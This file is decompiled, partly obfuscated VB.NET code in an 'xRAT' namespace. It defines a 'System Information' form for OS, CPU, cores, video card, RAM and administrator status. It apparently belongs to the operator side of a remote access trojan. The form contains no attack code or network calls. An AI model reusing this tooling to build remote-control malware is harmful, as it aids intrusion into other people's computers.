Imports Microsoft.VisualBasic.CompilerServices
Imports System
Imports System.Collections
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms

Namespace xRAT
    <DesignerGenerated> _
    Public Class SysInfo
        Inherits Form
        ' Methods
        Public Sub New()
            Class1.QaIGh5M7cuigS
            AddHandler MyBase.Load, New EventHandler(AddressOf Me.SysInfo_Load)
            Me.InitializeComponent
        End Sub

        <DebuggerNonUserCode> _
        Protected Overrides Sub Dispose(ByVal disposing As Boolean)
            Try 
                If (disposing AndAlso (Not Me.icontainer_0 Is Nothing)) Then
                    Me.icontainer_0.Dispose
                End If
            Finally
                MyBase.Dispose(disposing)
            End Try
        End Sub

        Private Sub exitbtn_Click(ByVal sender As Object, ByVal e As EventArgs)
            Me.Close
        End Sub

        <DebuggerStepThrough> _
        Private Sub InitializeComponent()
            Dim manager As New ComponentResourceManager(GetType(SysInfo))
            Me.exitbtn = New Button
            Me.Label1 = New Label
            Me.Label2 = New Label
            Me.Label3 = New Label
            Me.TextBox1 = New TextBox
            Me.TextBox2 = New TextBox
            Me.TextBox3 = New TextBox
            Me.TextBox4 = New TextBox
            Me.Label4 = New Label
            Me.TextBox5 = New TextBox
            Me.Label5 = New Label
            Me.TextBox6 = New TextBox
            Me.Label6 = New Label
            Me.Label7 = New Label
            Me.TextBox7 = New TextBox
            Me.Label8 = New Label
            Me.PictureBox1 = New PictureBox
            DirectCast(Me.PictureBox1, ISupportInitialize).BeginInit
            Me.SuspendLayout
            Dim point As New Point(&H101, &H115)
            Me.exitbtn.Location = point
            Me.exitbtn.Name = "exitbtn"
            Dim size As New Size(&H4E, &H18)
            Me.exitbtn.Size = size
            Me.exitbtn.TabIndex = 5
            Me.exitbtn.Text = "&Close"
            Me.exitbtn.UseVisualStyleBackColor = True
            Me.Label1.AutoSize = True
            Me.Label1.Font = New Font("Microsoft Sans Serif", 8.25!, FontStyle.Bold, GraphicsUnit.Point, 0)
            point = New Point(12, 9)
            Me.Label1.Location = point
            Me.Label1.Name = "Label1"
            size = New Size(&H6A, 13)
            Me.Label1.Size = size
            Me.Label1.TabIndex = 6
            Me.Label1.Text = "Operating System"
            Me.Label2.AutoSize = True
            Me.Label2.Font = New Font("Microsoft Sans Serif", 8.25!, FontStyle.Bold, GraphicsUnit.Point, 0)
            point = New Point(12, &H2F)
            Me.Label2.Location = point
            Me.Label2.Name = "Label2"
            size = New Size(&H3F, 13)
            Me.Label2.Size = size
            Me.Label2.TabIndex = 7
            Me.Label2.Text = "Processor"
            Me.Label3.AutoSize = True
            Me.Label3.Font = New Font("Microsoft Sans Serif", 8.25!, FontStyle.Bold, GraphicsUnit.Point, 0)
            point = New Point(12, &H57)
            Me.Label3.Location = point
            Me.Label3.Name = "Label3"
            size = New Size(&H65, 13)
            Me.Label3.Size = size
            Me.Label3.TabIndex = 8
            Me.Label3.Text = "Number of Cores"
            Me.TextBox1.BackColor = Color.White
            Me.TextBox1.BorderStyle = BorderStyle.None
            point = New Point(15, &H19)
            Me.TextBox1.Location = point
            Me.TextBox1.Name = "TextBox1"
            Me.TextBox1.ReadOnly = True
            size = New Size(320, 14)
            Me.TextBox1.Size = size
            Me.TextBox1.TabIndex = 9
            Me.TextBox2.BackColor = Color.White
            Me.TextBox2.BorderStyle = BorderStyle.None
            point = New Point(15, &H40)
            Me.TextBox2.Location = point
            Me.TextBox2.Name = "TextBox2"
            Me.TextBox2.ReadOnly = True
            size = New Size(320, 14)
            Me.TextBox2.Size = size
            Me.TextBox2.TabIndex = 10
            Me.TextBox3.BackColor = Color.White
            Me.TextBox3.BorderStyle = BorderStyle.None
            point = New Point(15, &H67)
            Me.TextBox3.Location = point
            Me.TextBox3.Name = "TextBox3"
            Me.TextBox3.ReadOnly = True
            size = New Size(320, 14)
            Me.TextBox3.Size = size
            Me.TextBox3.TabIndex = 11
            Me.TextBox4.BackColor = Color.White
            Me.TextBox4.BorderStyle = BorderStyle.None
            point = New Point(15, &H8E)
            Me.TextBox4.Location = point
            Me.TextBox4.Name = "TextBox4"
            Me.TextBox4.ReadOnly = True
            size = New Size(320, 14)
            Me.TextBox4.Size = size
            Me.TextBox4.TabIndex = 13
            Me.Label4.AutoSize = True
            Me.Label4.Font = New Font("Microsoft Sans Serif", 8.25!, FontStyle.Bold, GraphicsUnit.Point, 0)
            point = New Point(12, &H7E)
            Me.Label4.Location = point
            Me.Label4.Name = "Label4"
            size = New Size(&H45, 13)
            Me.Label4.Size = size
            Me.Label4.TabIndex = 12
            Me.Label4.Text = "Video Card"
            Me.TextBox5.BackColor = Color.White
            Me.TextBox5.BorderStyle = BorderStyle.None
            point = New Point(15, &HB5)
            Me.TextBox5.Location = point
            Me.TextBox5.Name = "TextBox5"
            Me.TextBox5.ReadOnly = True
            size = New Size(320, 14)
            Me.TextBox5.Size = size
            Me.TextBox5.TabIndex = 15
            Me.Label5.AutoSize = True
            Me.Label5.Font = New Font("Microsoft Sans Serif", 8.25!, FontStyle.Bold, GraphicsUnit.Point, 0)
            point = New Point(12, &HA5)
            Me.Label5.Location = point
            Me.Label5.Name = "Label5"
            size = New Size(&H71, 13)
            Me.Label5.Size = size
            Me.Label5.TabIndex = 14
            Me.Label5.Text = "Windows Directory"
            Me.TextBox6.BackColor = Color.White
            Me.TextBox6.BorderStyle = BorderStyle.None
            point = New Point(15, 220)
            Me.TextBox6.Location = point
            Me.TextBox6.Name = "TextBox6"
            Me.TextBox6.ReadOnly = True
            size = New Size(320, 14)
            Me.TextBox6.Size = size
            Me.TextBox6.TabIndex = &H11
            Me.Label6.AutoSize = True
            Me.Label6.Font = New Font("Microsoft Sans Serif", 8.25!, FontStyle.Bold, GraphicsUnit.Point, 0)
            point = New Point(12, &HCC)
            Me.Label6.Location = point
            Me.Label6.Name = "Label6"
            size = New Size(&H41, 13)
            Me.Label6.Size = size
            Me.Label6.TabIndex = &H10
            Me.Label6.Text = "Max. RAM"
            Me.Label7.AutoSize = True
            point = New Point(&H25, &H11B)
            Me.Label7.Location = point
            Me.Label7.Name = "Label7"
            size = New Size(&H49, 13)
            Me.Label7.Size = size
            Me.Label7.TabIndex = &H12
            Me.Label7.Text = "Please wait..."
            Me.TextBox7.BackColor = Color.White
            Me.TextBox7.BorderStyle = BorderStyle.None
            point = New Point(15, &H102)
            Me.TextBox7.Location = point
            Me.TextBox7.Name = "TextBox7"
            Me.TextBox7.ReadOnly = True
            size = New Size(320, 14)
            Me.TextBox7.Size = size
            Me.TextBox7.TabIndex = &H15
            Me.Label8.AutoSize = True
            Me.Label8.Font = New Font("Microsoft Sans Serif", 8.25!, FontStyle.Bold, GraphicsUnit.Point, 0)
            point = New Point(12, &HF2)
            Me.Label8.Location = point
            Me.Label8.Name = "Label8"
            size = New Size(&HA5, 13)
            Me.Label8.Size = size
            Me.Label8.TabIndex = 20
            Me.Label8.Text = "Has Administrator Privileges"
            Me.PictureBox1.Image = Class5.smethod_49
            point = New Point(15, &H11A)
            Me.PictureBox1.Location = point
            Me.PictureBox1.Name = "PictureBox1"
            size = New Size(&H10, &H10)
            Me.PictureBox1.Size = size
            Me.PictureBox1.SizeMode = PictureBoxSizeMode.AutoSize
            Me.PictureBox1.TabIndex = &H13
            Me.PictureBox1.TabStop = False
            Dim ef As New SizeF(6!, 13!)
            Me.AutoScaleDimensions = ef
            Me.AutoScaleMode = AutoScaleMode.Font
            Me.BackColor = Color.White
            size = New Size(&H15B, 310)
            Me.ClientSize = size
            Me.Controls.Add(Me.TextBox7)
            Me.Controls.Add(Me.Label8)
            Me.Controls.Add(Me.PictureBox1)
            Me.Controls.Add(Me.Label7)
            Me.Controls.Add(Me.TextBox6)
            Me.Controls.Add(Me.Label6)
            Me.Controls.Add(Me.TextBox5)
            Me.Controls.Add(Me.Label5)
            Me.Controls.Add(Me.TextBox4)
            Me.Controls.Add(Me.Label4)
            Me.Controls.Add(Me.TextBox3)
            Me.Controls.Add(Me.TextBox2)
            Me.Controls.Add(Me.TextBox1)
            Me.Controls.Add(Me.Label3)
            Me.Controls.Add(Me.Label2)
            Me.Controls.Add(Me.Label1)
            Me.Controls.Add(Me.exitbtn)
            Me.FormBorderStyle = FormBorderStyle.Fixed3D
            Me.Icon = DirectCast(manager.GetObject("$this.Icon"), Icon)
            Me.MaximizeBox = False
            Me.MinimizeBox = False
            Me.Name = "SysInfo"
            Me.StartPosition = FormStartPosition.CenterScreen
            Me.Text = "System Information"
            DirectCast(Me.PictureBox1, ISupportInitialize).EndInit
            Me.ResumeLayout(False)
            Me.PerformLayout
        End Sub

        Private Sub SysInfo_Load(ByVal sender As Object, ByVal e As EventArgs)
            Dim enumerator As IEnumerator
            Try 
                enumerator = Me.Controls.GetEnumerator
                Do While enumerator.MoveNext
                    Dim objectValue As Object = RuntimeHelpers.GetObjectValue(enumerator.Current)
                    If objectValue.ToString.Contains("TextBox") Then
                        NewLateBinding.LateSet(objectValue, Nothing, "Text", New Object() { Nothing }, Nothing, Nothing)
                    End If
                Loop
            Finally
                If TypeOf enumerator Is IDisposable Then
                    TryCast(enumerator,IDisposable).Dispose
                End If
            End Try
            Me.PictureBox1.Visible = True
            Me.Label7.Visible = True
        End Sub


        ' Properties
        Friend Overridable Property exitbtn As Button
            Get
                Return Me._exitbtn
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As Button)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.exitbtn_Click)
                If (Not Me._exitbtn Is Nothing) Then
                    RemoveHandler Me._exitbtn.Click, handler
                End If
                Me._exitbtn = value
                If (Not Me._exitbtn Is Nothing) Then
                    AddHandler Me._exitbtn.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property Label1 As Label
            Get
                Return Me._Label1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As Label)
                Me._Label1 = value
            End Set
        End Property

        Friend Overridable Property Label2 As Label
            Get
                Return Me._Label2
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As Label)
                Me._Label2 = value
            End Set
        End Property

        Friend Overridable Property Label3 As Label
            Get
                Return Me._Label3
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As Label)
                Me._Label3 = value
            End Set
        End Property

        Friend Overridable Property Label4 As Label
            Get
                Return Me._Label4
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As Label)
                Me._Label4 = value
            End Set
        End Property

        Friend Overridable Property Label5 As Label
            Get
                Return Me._Label5
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As Label)
                Me._Label5 = value
            End Set
        End Property

        Friend Overridable Property Label6 As Label
            Get
                Return Me._Label6
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As Label)
                Me._Label6 = value
            End Set
        End Property

        Friend Overridable Property Label7 As Label
            Get
                Return Me._Label7
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As Label)
                Me._Label7 = value
            End Set
        End Property

        Friend Overridable Property Label8 As Label
            Get
                Return Me._Label8
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As Label)
                Me._Label8 = value
            End Set
        End Property

        Friend Overridable Property PictureBox1 As PictureBox
            Get
                Return Me._PictureBox1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As PictureBox)
                Me._PictureBox1 = value
            End Set
        End Property

        Friend Overridable Property TextBox1 As TextBox
            Get
                Return Me._TextBox1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As TextBox)
                Me._TextBox1 = value
            End Set
        End Property

        Friend Overridable Property TextBox2 As TextBox
            Get
                Return Me._TextBox2
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As TextBox)
                Me._TextBox2 = value
            End Set
        End Property

        Friend Overridable Property TextBox3 As TextBox
            Get
                Return Me._TextBox3
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As TextBox)
                Me._TextBox3 = value
            End Set
        End Property

        Friend Overridable Property TextBox4 As TextBox
            Get
                Return Me._TextBox4
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As TextBox)
                Me._TextBox4 = value
            End Set
        End Property

        Friend Overridable Property TextBox5 As TextBox
            Get
                Return Me.daxawBwCf
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As TextBox)
                Me.daxawBwCf = value
            End Set
        End Property

        Friend Overridable Property TextBox6 As TextBox
            Get
                Return Me._TextBox6
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As TextBox)
                Me._TextBox6 = value
            End Set
        End Property

        Friend Overridable Property TextBox7 As TextBox
            Get
                Return Me._TextBox7
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As TextBox)
                Me._TextBox7 = value
            End Set
        End Property


        ' Fields
        <AccessedThroughProperty("exitbtn")> _
        Private _exitbtn As Button
        <AccessedThroughProperty("Label1")> _
        Private _Label1 As Label
        <AccessedThroughProperty("Label2")> _
        Private _Label2 As Label
        <AccessedThroughProperty("Label3")> _
        Private _Label3 As Label
        <AccessedThroughProperty("Label4")> _
        Private _Label4 As Label
        <AccessedThroughProperty("Label5")> _
        Private _Label5 As Label
        <AccessedThroughProperty("Label6")> _
        Private _Label6 As Label
        <AccessedThroughProperty("Label7")> _
        Private _Label7 As Label
        <AccessedThroughProperty("Label8")> _
        Private _Label8 As Label
        <AccessedThroughProperty("PictureBox1")> _
        Private _PictureBox1 As PictureBox
        <AccessedThroughProperty("TextBox1")> _
        Private _TextBox1 As TextBox
        <AccessedThroughProperty("TextBox2")> _
        Private _TextBox2 As TextBox
        <AccessedThroughProperty("TextBox3")> _
        Private _TextBox3 As TextBox
        <AccessedThroughProperty("TextBox4")> _
        Private _TextBox4 As TextBox
        <AccessedThroughProperty("TextBox6")> _
        Private _TextBox6 As TextBox
        <AccessedThroughProperty("TextBox7")> _
        Private _TextBox7 As TextBox
        <AccessedThroughProperty("TextBox5")> _
        Private daxawBwCf As TextBox
        Private icontainer_0 As IContainer
    End Class
End Namespace

